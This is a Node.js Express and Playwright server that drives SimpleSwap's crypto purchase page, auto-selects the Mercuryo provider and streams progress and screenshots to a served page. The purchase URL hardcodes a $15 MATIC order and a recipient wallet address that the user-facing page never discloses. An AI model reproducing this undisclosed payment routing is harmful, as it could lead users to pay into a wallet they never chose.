const express = require('express');
const { chromium } = require('playwright');
const app = express();
const PORT = 3000;

// Browser pool for performance
const browserPool = [];
const MAX_BROWSERS = 3;

// Initialize browser pool
async function initBrowserPool() {
    for (let i = 0; i < MAX_BROWSERS; i++) {
        const browser = await chromium.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-dev-shm-usage']
        });
        browserPool.push({ browser, inUse: false });
    }
    console.log(`Browser pool initialized with ${MAX_BROWSERS} instances`);
}

// Get available browser from pool
async function getBrowser() {
    let poolItem = browserPool.find(item => !item.inUse);
    if (!poolItem) {
        // Create new browser if none available
        const browser = await chromium.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-dev-shm-usage']
        });
        poolItem = { browser, inUse: true };
        browserPool.push(poolItem);
    }
    poolItem.inUse = true;
    return poolItem;
}

// Release browser back to pool
function releaseBrowser(poolItem) {
    poolItem.inUse = false;
}

// Serve the client page
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>SimpleSwap Auto-Mercuryo Proxy</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #000;
            color: #fff;
            margin: 0;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 500px;
            text-align: center;
        }
        
        .status {
            background: #111;
            border-radius: 20px;
            padding: 40px;
            margin-top: 20px;
        }
        
        .loading {
            display: none;
        }
        
        .loading.active {
            display: block;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 3px solid #333;
            border-top-color: #00ff00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .step {
            background: #222;
            border-radius: 12px;
            padding: 16px;
            margin: 10px 0;
            opacity: 0.5;
            transition: all 0.3s;
        }
        
        .step.active {
            opacity: 1;
            border: 1px solid #00ff00;
        }
        
        .step.completed {
            opacity: 1;
            border: 1px solid #00ff00;
            background: #001100;
        }
        
        .button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 20px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 20px;
        }
        
        .error {
            background: #330000;
            border: 1px solid #ff0000;
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
            display: none;
        }
        
        .success {
            background: #003300;
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
            display: none;
        }
        
        iframe {
            width: 100%;
            height: 600px;
            border: 2px solid #333;
            border-radius: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Auto-Mercuryo Proxy</h1>
        <p>This service automatically selects Mercuryo for you</p>
        
        <button class="button" onclick="startProxy()">Start Automated Purchase</button>
        
        <div class="status loading" id="loading">
            <div class="spinner"></div>
            <h2>Processing...</h2>
            
            <div class="step" id="step1">
                <strong>Step 1:</strong> Launching secure browser
            </div>
            
            <div class="step" id="step2">
                <strong>Step 2:</strong> Navigating to SimpleSwap
            </div>
            
            <div class="step" id="step3">
                <strong>Step 3:</strong> Waiting for page load
            </div>
            
            <div class="step" id="step4">
                <strong>Step 4:</strong> Finding buy button
            </div>
            
            <div class="step" id="step5">
                <strong>Step 5:</strong> Selecting Mercuryo provider
            </div>
            
            <div class="step" id="step6">
                <strong>Step 6:</strong> Capturing result
            </div>
        </div>
        
        <div class="error" id="error"></div>
        <div class="success" id="success"></div>
        
        <div id="result"></div>
    </div>
    
    <script>
        let eventSource;
        
        async function startProxy() {
            document.getElementById('loading').classList.add('active');
            document.getElementById('error').style.display = 'none';
            document.getElementById('success').style.display = 'none';
            document.querySelector('.button').disabled = true;
            
            // Reset steps
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active', 'completed');
            });
            
            // Connect to SSE endpoint
            eventSource = new EventSource('/proxy-stream');
            
            eventSource.onmessage = (event) => {
                const data = JSON.parse(event.data);
                
                if (data.step) {
                    // Update step status
                    const stepEl = document.getElementById('step' + data.step);
                    if (stepEl) {
                        if (data.status === 'active') {
                            stepEl.classList.add('active');
                        } else if (data.status === 'completed') {
                            stepEl.classList.remove('active');
                            stepEl.classList.add('completed');
                        }
                    }
                }
                
                if (data.error) {
                    showError(data.error);
                }
                
                if (data.success) {
                    showSuccess(data.url);
                }
                
                if (data.screenshot) {
                    showScreenshot(data.screenshot);
                }
            };
            
            eventSource.onerror = () => {
                showError('Connection lost. Please try again.');
                cleanup();
            };
        }
        
        function showError(message) {
            document.getElementById('loading').classList.remove('active');
            document.getElementById('error').textContent = message;
            document.getElementById('error').style.display = 'block';
            cleanup();
        }
        
        function showSuccess(url) {
            document.getElementById('loading').classList.remove('active');
            document.getElementById('success').innerHTML = 
                '<h3>✅ Success!</h3>' +
                '<p>Mercuryo has been automatically selected.</p>' +
                '<a href="' + url + '" target="_blank" style="color: #00ff00;">Continue to payment →</a>';
            document.getElementById('success').style.display = 'block';
        }
        
        function showScreenshot(data) {
            document.getElementById('result').innerHTML = 
                '<h3>Preview:</h3>' +
                '<img src="data:image/png;base64,' + data + '" style="width:100%; border-radius:12px; margin-top:10px;">';
        }
        
        function cleanup() {
            if (eventSource) {
                eventSource.close();
            }
            document.querySelector('.button').disabled = false;
        }
    </script>
</body>
</html>
    `);
});

// Server-Sent Events endpoint for real-time updates
app.get('/proxy-stream', async (req, res) => {
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    });
    
    const sendUpdate = (data) => {
        res.write(`data: ${JSON.stringify(data)}\n\n`);
    };
    
    let poolItem;
    let context;
    let page;
    
    try {
        // Step 1: Get browser
        sendUpdate({ step: 1, status: 'active' });
        poolItem = await getBrowser();
        sendUpdate({ step: 1, status: 'completed' });
        
        // Step 2: Create context and navigate
        sendUpdate({ step: 2, status: 'active' });
        context = await poolItem.browser.newContext({
            viewport: { width: 390, height: 844 },
            userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            hasTouch: true,
            isMobile: true
        });
        
        page = await context.newPage();
        
        const simpleSwapUrl = 'https://simpleswap.io/buy-crypto?' + new URLSearchParams({
            from: 'usd',
            to: 'matic-polygon',
            amount: 15,
            address: '0xE5173e7c3089bD89cd1341b637b8e1951745ED5C'
        });
        
        await page.goto(simpleSwapUrl);
        sendUpdate({ step: 2, status: 'completed' });
        
        // Step 3: Wait for page load
        sendUpdate({ step: 3, status: 'active' });
        await page.waitForLoadState('networkidle');
        await page.waitForTimeout(2000);
        sendUpdate({ step: 3, status: 'completed' });
        
        // Step 4: Find and click buy button
        sendUpdate({ step: 4, status: 'active' });
        
        // Try multiple selectors for the buy button
        const buyButtonSelectors = [
            'button:has-text("Buy")',
            '[data-test="buy-button"]',
            'button.buy-button',
            'a[href*="buy"]:has-text("Buy")'
        ];
        
        let clicked = false;
        for (const selector of buyButtonSelectors) {
            try {
                await page.click(selector, { timeout: 5000 });
                clicked = true;
                break;
            } catch (e) {
                // Try next selector
            }
        }
        
        if (!clicked) {
            throw new Error('Could not find buy button');
        }
        
        sendUpdate({ step: 4, status: 'completed' });
        
        // Step 5: Wait for providers and select Mercuryo
        sendUpdate({ step: 5, status: 'active' });
        await page.waitForTimeout(3000); // Wait for providers to load
        
        // Try to find and click Mercuryo
        const mercuryoSelectors = [
            'text=Mercuryo',
            '[data-provider="mercuryo"]',
            'button:has-text("Mercuryo")',
            'div:has-text("Mercuryo"):visible'
        ];
        
        let mercuryoClicked = false;
        for (const selector of mercuryoSelectors) {
            try {
                await page.click(selector, { timeout: 5000 });
                mercuryoClicked = true;
                break;
            } catch (e) {
                // Try next selector
            }
        }
        
        if (!mercuryoClicked) {
            // If we can't find Mercuryo, take a screenshot to show what's available
            const screenshot = await page.screenshot({ encoding: 'base64' });
            sendUpdate({ screenshot });
            throw new Error('Could not find Mercuryo option. It may need to be scrolled into view.');
        }
        
        sendUpdate({ step: 5, status: 'completed' });
        
        // Step 6: Capture result
        sendUpdate({ step: 6, status: 'active' });
        await page.waitForTimeout(2000);
        
        // Get the current URL (might have changed)
        const finalUrl = page.url();
        
        // Take a screenshot
        const screenshot = await page.screenshot({ encoding: 'base64' });
        sendUpdate({ screenshot });
        
        sendUpdate({ step: 6, status: 'completed' });
        sendUpdate({ success: true, url: finalUrl });
        
    } catch (error) {
        console.error('Proxy error:', error);
        sendUpdate({ error: error.message });
    } finally {
        // Cleanup
        if (context) await context.close();
        if (poolItem) releaseBrowser(poolItem);
        res.end();
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        browsers: browserPool.length,
        inUse: browserPool.filter(item => item.inUse).length
    });
});

// Start server
app.listen(PORT, async () => {
    console.log(`Browser proxy server running on http://localhost:${PORT}`);
    await initBrowserPool();
});